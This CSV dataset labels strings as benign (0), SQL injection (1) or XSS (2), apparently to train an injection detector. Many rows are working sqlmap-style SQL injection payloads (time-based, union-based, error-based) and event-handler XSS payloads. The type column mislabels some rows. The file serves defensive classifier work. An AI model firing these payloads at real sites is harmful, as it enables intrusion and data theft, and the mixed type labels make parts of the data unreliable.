Text,Label,type
SELECT * FROM screen WHERE hide = 'invented' LIMIT 3,0,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tfoot>",2,xss
" SELECT * FROM memory ORDER BY care, mathematics",0,sql
SELECT COUNT ( won )  FROM should,0,sql
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",1,sql
" SELECT * FROM per ORDER BY straight ASC, trail DESC",0,xss
ibarra,0,sql
"<sup draggable=""true"" ondragstart=""alert(1)"">test</sup>",2,xss
"  SELECT Orders.roperID, Employees.pitch, Employees.grain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.headingID ORDER BY Orders.loveID",0,sql
	 </span></a>.</li>,0,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'juhi' like 'juhi",1,sql
SELECT * FROM whale  WHERE industrial NOT LIKE '[nearby]%',0,sql
"<li id=""cite_note-145""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-145"">^ </a> </b> ",0,xss
SELECT AVG ( Price ) FROM on,0,sql
SELECT MIN ( general )  AS add FROM willing,0,sql
SELECT * FROM butter WHERE within BETWEEN not09/01/1996border AND birds15/31/1996vertical,0,xss
SELECT * FROM egg WHERE thousand = 'mirror'  AND City = 'mainly',0,sql
SELECT * FROM finish 3 SELECT * FROM pale,0,sql
DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste';,0,sql
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1,sql
"<li id=""cite_note-K-nearest_neighbor_algorithm-222""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-K-nearest_neighbor_algorithm_222-0"">^ </a> </b> ",0,xss
"<li><a href=""/wiki/Software_configuration_management"" title=""Software configuration management"">Software configuration management </a> </li>",0,xss
</dl>,0,xss
SELECT * FROM orbit  WHERE house = dozen,0,sql
"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",1,sql
"	 <div class=""magnify""><a href=""/wiki/File:D%C3%A9tection_de_personne_-_exemple_3.jpg"" class=""internal"" title=""Enlarge""> </a> </div>A self-driving car system may use a neural network to determine which parts of the picture seem to match previous training images of pedestrians, and then model those areas as slow-moving but somewhat unpredictable rectangular prisms that must be avoided.<sup id=""cite_ref-79"" class=""reference""><a href=""#cite_note-79"">&#91;76&#93; </a> </sup><sup id=""cite_ref-80"" class=""reference""><a href=""#cite_note-80"">&#91;77&#93; </a> </sup> </div> </div> </div>",0,xss
Biological intelligence vs. intelligence in general:,0,xss
" SELECT * FROM human ORDER BY social ASC, exercise DESC",0,sql
mendie,0,sql
SELECT * FROM cotton,0,sql
SELECT AVG ( Price ) FROM angry,0,sql
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",2,xss
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",2,xss
	 </span>,0,xss
SELECT * FROM pull 3 SELECT * FROM topic,0,sql
"1'||  (  select 'yrau' where 7860  =  7860 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1,sql
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",1,sql
 UPDATE alphabet SET colony = 'cutting'WHERE taken = 'stems',0,sql
-5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
SELECT AVG ( shirt ) FROM cave,0,xss
SELECT * FROM excellent FETCH FIRST 3 ROWS ONLY,0,xss
6.95924E+15,0,sql
"  SELECT * FROM claws WHERE pour NOT IN  ( 'mountain', 'began', 'prove' )  ",0,sql
<ins onpointerout=alert(1)>XSS</ins>,2,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 24 )  ORDER BY meta_id ASC",0,sql
 </li>,0,xss
"c/ lorenzo solano tendero, s/n 8b",0,sql
" SELECT * FROM police ORDER BY forward ASC, than DESC",0,sql
3.74288E+15,0,sql
mary-ell,0,xss
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",1,sql
<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>,2,xss
"1""  )   where 7840  =  7840 union all select null,null#",1,sql
<image2 onpointerleave=alert(1)>XSS</image2>,2,xss
"<li><a href=""/wiki/Social_software"" title=""Social software"">Social information systems </a> </li>",0,xss
-9809' order by 1--,1,sql
"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,sql
1  )   as imdt where 6431  =  6431,1,sql
28900,0,sql
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",1,xss
"1%""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,sql
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>",2,xss
"calle marsella s/n,",0,sql
<animatemotion onpointerover=alert(1)>XSS</animatemotion>,2,xss
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,sql
SELECT AVG ( writing )  FROM bad  SELECT SUM ( shout ) ,0,sql
"1""   )    )    as qgwq where 6122  =  6122",1,sql
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",2,xss
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,2,xss
<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>,2,xss
"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",2,xss
" </tr><tr><th style=""padding:0.1em"">",0,xss
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,sql
SELECT * FROM anywhere WHERE NOT mountain = 'aboard'  AND NOT motion = 'moment',0,sql
"1' where 7104  =  7104 union all select null,null,null,null,null,null,null#",1,sql
smoot,0,sql
"<ul><li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0,xss
"<u onmouseover=""alert(1)"">test</u>",2,xss
"<a href=""/wiki/Search_algorithm"" title=""Search algorithm"">Search algorithms </a>:",0,xss
SELECT vowel ( s ) FROM burn INNER JOIN,0,sql
"<li id=""cite_note-332""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-332"">^ </a> </b> ",0,xss
5ecom058a?8a,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=66"" title=""Edit section: Technological singularity"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,sql
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
1 where 1519  =  1519,1,sql
"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",1,sql
"-5703'  )   or elt  (  2972  =  8708,8708  )  ",1,sql
"<small onmouseenter=""alert(1)"">test</small>",2,xss
telema,0,xss
"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",2,xss
"  UPDATE operation SET bat =  'below', City =  'ice' WHERE president =  fell",0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262310,262326,262328 )  ORDER BY meta_id ASC",0,xss
<set onpointerover=alert(1)>XSS</set>,2,xss
"   SELECT pleasant, affect, even FROM zoo WHERE meet  IS NULL",0,xss
 </li>,0,xss
yihban,0,xss
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",1,sql
"  UPDATE syllable SET regular =  'went', City =  'provide' WHERE deeply =  swung",0,sql
"<style>@keyframes slidein {}</style><dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dialog>",2,xss
SELECT * FROM simply WHERE hurried NOT LIKE 'alphabet%',0,xss
longo,0,xss
1'   )    )    as yyud where 4934  =  4934,1,sql
SELECT * FROM sudden FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM soldier,0,sql
SELECT * FROM handsome WHERE five = 'anyway' FETCH FIRST 3 ROWS ONLY,0,sql
8.27055E+15,0,sql
SELECT * FROM jack WHERE view IN  ( SELECT known FROM world ) ,0,xss
33423,0,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',1,sql
<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,2,xss
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,sql
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,1,sql
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",2,xss
"<li><a href=""/wiki/Wikidata"" title=""Wikidata"">Wikidata </a><span class=""nowrap"">&#160; ",0,xss
SELECT * FROM handsome WHERE stairs LIKE '%consonant%',0,sql
backes@kimkardashian.com.lk,0,sql
garantir,0,sql
"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",1,xss
31013,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;504–519, </li>",0,xss
7.50908E+15,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Mahdawi, Arwa (26 June 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/us-news/2017/jun/26/jobs-future-automation-robots-skills-creative-health"">""What jobs will still be around in 20 years? Read this to prepare your future"" </a>. <i>The Guardian </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",0,xss
SELECT folks ( s )  FROM loss SELECT might ( s ) ,0,sql
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",1,sql
23670,0,sql
1%'  )   waitfor delay '0:0:5' and   (  '%'  =  ',1,sql
"<video onmouseover=""alert(1)"">test</video>",2,xss
" select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",1,sql
SELECT these FROM change,0,sql
-5134   )    )     )   or 8571  =  8571--,1,xss
"<bgsound onclick=""alert(1)"">test</bgsound>",2,xss
SELECT * FROM dull WHERE NOT numeral = 'smile'  AND NOT stared = 'way',0,sql
<em onpointerdown=alert(1)>XSS</em>,2,xss
c/ txapin ene 162,0,sql
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,2,xss
SELECT * FROM burst WHERE voyage = 'period'  OR sign = 'poetry',0,sql
SELECT third FROM dozen UNION ALL SELECT wonderful FROM opportunity ORDER BY welcome,0,sql
"  SELECT stared AS else, poetry AS [sand]  FROM split",0,sql
SELECT * FROM putting ORDER BY south DESC,0,sql
maraa,0,sql
"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",1,sql
"guadalajara, 101 4-e",0,sql
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1,sql
dcada,0,sql
amber,0,sql
"   SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL",0,sql
<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>,2,xss
"1%'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1,xss
24596413y,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 29420 )  ORDER BY meta_id ASC",0,sql
SELECT * FROM rush 3 SELECT * FROM anyway,0,sql
"""a"""" or 1  =  1--""",1,sql
"<li><a href=""/wiki/Distributed_artificial_intelligence"" title=""Distributed artificial intelligence"">Distributed artificial intelligence </a> </li> </ul>",0,xss
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""qqfd"" like ""qqfd",1,xss
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",1,xss
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,2,xss
1'||  (  select 'hkvl' from dual where 8882  =  8882,1,xss
6ong6,0,sql
glickman,0,sql
"1""   )    )    as dooq where 7911  =  7911",1,sql
<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>,2,xss
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz",1,sql
SELECT crack ( s ) FROM sport INNER JOIN,0,sql
"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",1,sql
"<div id=""p-cactions"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-cactions-label"">",0,xss
-8515' or 1329  =  9536,1,sql
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0,sql
"-9509  )   union all select 1193,1193,1193#",1,xss
"-6333""   )    )     )   union all select 9851,9851,9851,9851,9851,9851--",1,sql
"1 union all select null,null--",1,sql
SELECT TOP 3 * FROM fed SELECT * FROM line 3SELECT * FROM verb,0,sql
"1%'   )    )     )   union all select null,null,null--",1,sql
l1am217r5,0,sql
"<applet oncut=""alert(1)"" contenteditable>test</applet>",2,xss
1' where 8159  =  8159 union all select null#,1,sql
1%' order by 1#,1,sql
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",1,xss
1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1,sql
SELECT * FROM Customers  WHERE City LIKE '[!bsp]%';,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'options_number_of_support_family' LIMIT 1,0,xss
rasmia,0,xss
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
1.94093E+15,0,sql
 </li>,0,xss
"puerta del sol 124, 8?h",0,sql
"  SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter",0,sql
es518l132n,0,sql
"	 <div id=""Philosophy_of_mind"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Philosophy_of_mind"" title=""Philosophy of mind"">Philosophy of mind </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Theories </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT * FROM notice WHERE attached NOT LIKE '[climb]%',0,sql
SELECT AVG ( Price ) FROM noted,0,xss
SELECT COUNT ( beginning )  FROM port,0,xss
SELECT * FROM excellent WHERE pressure = 'sides'  OR section = 'cutting',0,sql
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,2,xss
        <dt>On Read the Docs</dt>,0,xss
"<menu draggable=""true"" ondragstart=""alert(1)"">test</menu>",2,xss
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",2,xss
SELECT * FROM strange,0,sql
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",2,xss
"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '",1,sql
"<style>:target {color: red;}</style><sub id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sub>",2,xss
select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,xss
" </p><p>The main categories of networks are acyclic or <a href=""/wiki/Feedforward_neural_network"" title=""Feedforward neural network"">feedforward neural networks </a> (where the signal passes in only one direction) and <a href=""/wiki/Recurrent_neural_network"" title=""Recurrent neural network"">recurrent neural networks </a> (which allow feedback and short-term memories of previous input events). Among the most popular feedforward networks are <a href=""/wiki/Perceptron"" title=""Perceptron"">perceptrons </a>, <a href=""/wiki/Multi-layer_perceptron"" class=""mw-redirect"" title=""Multi-layer perceptron"">multi-layer perceptrons </a> and <a href=""/wiki/Radial_basis_network"" class=""mw-redirect"" title=""Radial basis network"">radial basis networks </a>.<sup id=""cite_ref-Feedforward_neural_networks_237-0"" class=""reference""><a href=""#cite_note-Feedforward_neural_networks-237"">&#91;226&#93; </a> </sup> Neural networks can be applied to the problem of <a href=""/wiki/Intelligent_control"" title=""Intelligent control"">intelligent control </a> (for robotics) or <a href=""/wiki/Machine_learning"" title=""Machine learning"">learning </a>, using such techniques as <a href=""/wiki/Hebbian_learning"" class=""mw-redirect"" title=""Hebbian learning"">Hebbian learning </a> (""fire together, wire together""), <a href=""/wiki/GMDH"" class=""mw-redirect"" title=""GMDH"">GMDH </a> or <a href=""/wiki/Competitive_learning"" title=""Competitive learning"">competitive learning </a>.<sup id=""cite_ref-Learning_in_neural_networks_238-0"" class=""reference""><a href=""#cite_note-Learning_in_neural_networks-238"">&#91;227&#93; </a> </sup>",0,xss
